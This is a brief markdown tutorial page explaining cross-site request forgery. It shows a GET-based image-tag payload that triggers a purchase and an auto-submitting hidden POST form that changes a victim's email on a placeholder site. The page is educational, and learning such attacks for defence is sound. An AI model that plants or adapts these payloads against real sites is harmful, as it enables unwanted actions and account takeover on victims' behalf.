# CSRF (Cross-site request forgery)

Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

### Table of content

- [How does it work ?](#how-does-it-work)
- [Get method]()
- [Post method]()

## How does it work ? 

Imagine that you've just opened a fraudulent link. A normal image could be `<img src="https://normal/img/dog">`, and the web browser would resolve the link and display the image.

Now, imagine that the image link is: `<img src="http://www.shopping-online.com/Index?buy=tv&nb=100&confirm=1">`.

In fact, thanks to CSRF, the hacker will attempt to use the connection cookies stored on your computer to make you perform unwanted actions behind your back. Here, they are trying to make you buy 100 TVs on the website http://www.shopping-online.com.

## Get Method

Get Method are easier to resolve and more predectible.

```html
<img src="http://www.shopping-online.com/Index?buy=tv&nb=100&confirm=1">
```

## Post Method

```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

---

[**:arrow_right_hook: Back home**](/README.md)
